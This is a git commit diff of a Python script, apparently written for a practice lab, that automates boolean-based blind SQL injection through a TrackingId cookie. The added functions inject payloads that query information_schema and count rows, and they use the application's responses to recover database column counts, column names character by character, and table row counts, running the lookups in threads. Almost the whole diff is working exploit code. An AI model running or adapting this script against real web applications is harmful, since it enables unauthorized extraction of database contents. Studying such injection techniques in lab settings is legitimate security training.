dfc451c912ba08e469870806a1d2a4d494f2b7df
brwnshoecrew <matthew.vorhees@gmail.com>
2021-05-10 11:09:56 -0500

    Added number of columns, number of rows, and column names.

--- practice.py
+++ practice.py
@@ -24,7 +24,7 @@ def login():
 
 def length_current_database():
 	for db_char_length in list(range(1,30)):
-		
+
 		query = f"' AND length(current_database())='{db_char_length}"
 		cookies = {
 			"session":session.cookies['session'],
@@ -67,7 +67,7 @@ def number_of_tables(current_database):
                 if pattern_string in response.text:
                         print(f"Current database has {num_of_tables_count} tables.")
                         return num_of_tables_count
-                        break	
+                        break
 
 def length_of_table_name(iterator):
         for table_char_length in list(range(1,30)):
@@ -82,7 +82,7 @@ def length_of_table_name(iterator):
 
                 if pattern_string in response.text:
                         return table_char_length
-                        break	
+                        break
 
 def enum_table_names(num_of_tables_count, index):
         for printableCharacter in string.ascii_lowercase:
@@ -99,47 +99,131 @@ def enum_table_names(num_of_tables_count, index):
                         return str(printableCharacter)
                         break
 
+def number_of_columns(query_table):
+	for num_of_columns_count in list(range(1,10)):
 
+		query = f"' AND (select count(*) from information_schema.columns where table_name='{query_table}')='{num_of_columns_count}"
+		cookies = {
+		"session":session.cookies['session'],
+		"TrackingId":f"{session.cookies['TrackingId']}{query}"
+		}
 
+		response = requests.get(rhost,cookies=cookies,verify=False)
 
-	
+		if pattern_string in response.text:
+			if num_of_columns_count == 1:
+				print(f"'{query_table}' table has 1 column.")
+			else:
+				print(f"'{query_table}' table has {num_of_columns_count} columns.")
+			return num_of_columns_count
+			break
+
+def length_of_column_name(iterator, query_table):
+	for column_char_length in list(range(1,40)):
+
+		query = f"' AND (select length(column_name) from information_schema.columns where table_name='{query_table}' limit 1 offset {iterator})='{column_char_length}"
+		cookies = {
+		"session":session.cookies['session'],
+		"TrackingId":f"{session.cookies['TrackingId']}{query}"
+		}
+
+		response = requests.get(rhost,cookies=cookies,verify=False)
+
+		if pattern_string in response.text:
+			return column_char_length
+			break
+
+def enum_column_names(num_of_columns_count, query_table, index):
+	for printableCharacter in string.printable:
+		query = f"' AND ((SELECT SUBSTRING(column_name,{index},1) from information_schema.columns where table_name='{query_table}') limit 1 offset {num_of_columns_count})='{printableCharacter}"
+		cookies = {
+		"session":session.cookies['session'],
+		"TrackingId":f"{session.cookies['TrackingId']}{query}"
+		}
+
+		response = requests.get(rhost,cookies=cookies,verify=False)
+
+		if pattern_string in response.text:
+			print(f"{printableCharacter}")
+			return str(printableCharacter)
+			break
+
+def num_of_table_rows(query_table):
+	for table_row_count in list(range(1,40)):
+
+		query = f"' AND (select count(*) from {query_table})='{table_row_count}"
+		cookies = {
+		"session":session.cookies['session'],
+		"TrackingId":f"{session.cookies['TrackingId']}{query}"
+		}
+
+		response = requests.get(rhost,cookies=cookies,verify=False)
+
+		if pattern_string in response.text:
+			return table_row_count
+			break
+
 
 if __name__ == "__main__":
 	# 1. Grab the tracking ID cookie from establishing a session.
 	tracking_ID = login()
 
 	# 2. Find out the character length of the current database name to use in finding the name of the current database.
-	db_char_length = length_current_database()
+	# db_char_length = length_current_database()
+	#
+	# # 3. Find the name of the current database using the character length of the current database name in variable db_char_length.
+	# with concurrent.futures.ThreadPoolExecutor() as executor:
+	# 	database_name_letters = executor.map(enum_current_database, list(range(1,db_char_length+1)))
+	# current_database = ''
+	# for letter in database_name_letters:
+	# 	current_database += letter
+	# print(f"Current database name is {current_database}")
+	#
+	# # 4. Find the number of tables in the current database.
+	# num_of_tables_count = number_of_tables(current_database)
+	#
+	# # 5. Find the character length of each table and then the name of each table.
+	# ## Outside loop on the number of tables in the current database.
+	# for iterator in range(0,num_of_tables_count):
+	# 	## Find the character length of the table being looped on.
+	# 	table_char_length = length_of_table_name(iterator)
+	# 	## Display the character length of the table number being looped on.
+	# 	print(f"Table number {iterator+1} character length is {table_char_length}")
+	# 	## Find the name of the table being looped on by using the lenght of the table and the iterator as inputs.
+	# 	with concurrent.futures.ThreadPoolExecutor() as executor:
+	# 		## Note this is how you pass two agruments to a function in this map call: iterator surrounded by repeat and the number of times to perform the operation dicted by the table_char_length value + 1.
+	# 		table_name_letters = executor.map(enum_table_names, repeat(iterator), list(range(1,table_char_length+1)))
+	# 	## Dipslay the name of the table being looped.
+	# 	table_name = ''
+	# 	for letter in table_name_letters:
+	# 		table_name += letter
+	# 	print(f"Table number {iterator+1} name is {table_name}")
 
-	# 3. Find the name of the current database using the character length of the current database name in variable db_char_length.
-	with concurrent.futures.ThreadPoolExecutor() as executor:
-		database_name_letters = executor.map(enum_current_database, list(range(1,db_char_length+1)))
-	current_database = ''
-	for letter in database_name_letters:
-		current_database += letter
-	print(f"Current database name is {current_database}")
+# Find the number of columns in a table dictated by the user in an argument being passed.
+	query_table = input("Enter table to enumerate: ")
+	num_of_columns_count = number_of_columns(query_table)
 
-	# 4. Find the number of tables in the current database.
-	num_of_tables_count = number_of_tables(current_database)
+# Find numebr of rows in the tables
+	table_row_count = num_of_table_rows(query_table)
+	print(f"{query_table} has {table_row_count} rows.")
 
-	# 5. Find the character length of each table and then the name of each table. 
-	## Outside loop on the number of tables in the current database.
-	for iterator in range(0,num_of_tables_count):
+# Find the character length of each column in the table name user parameter.	## Outside loop on the number of tables in the current database.
+# Find the name of each column in the table name user paramter.
+	for iterator in range(0,num_of_columns_count):
 		## Find the character length of the table being looped on.
-		table_char_length = length_of_table_name(iterator)
+		column_char_length = length_of_column_name(iterator, query_table)
 		## Display the character length of the table number being looped on.
-		print(f"Table number {iterator+1} character length is {table_char_length}")
+		print(f"Table {query_table} column number {iterator+1} character length is {column_char_length}")
 		## Find the name of the table being looped on by using the lenght of the table and the iterator as inputs.
 		with concurrent.futures.ThreadPoolExecutor() as executor:
 			## Note this is how you pass two agruments to a function in this map call: iterator surrounded by repeat and the number of times to perform the operation dicted by the table_char_length value + 1.
-			table_name_letters = executor.map(enum_table_names, repeat(iterator), list(range(1,table_char_length+1)))
+			column_name_letters = executor.map(enum_column_names, repeat(iterator), repeat(query_table), list(range(1,column_char_length+1)))
 		## Dipslay the name of the table being looped.
-		table_name = ''
-		for letter in table_name_letters:
-			table_name += letter
-		print(f"Table number {iterator+1} name is {table_name}")
+		column_name = ''
+		for letter in column_name_letters:
+			column_name += letter
+		print(f"Table {query_table} column number {iterator+1} name is {column_name}")
 
-# Find the number of columns in a table dictated by the user in an argument being passed.
-# Find the character length of each column in the table name user parameter.
-# Find the name of each column in the table name user paramter.
+
+
 # Find the values of the user defined column and table.
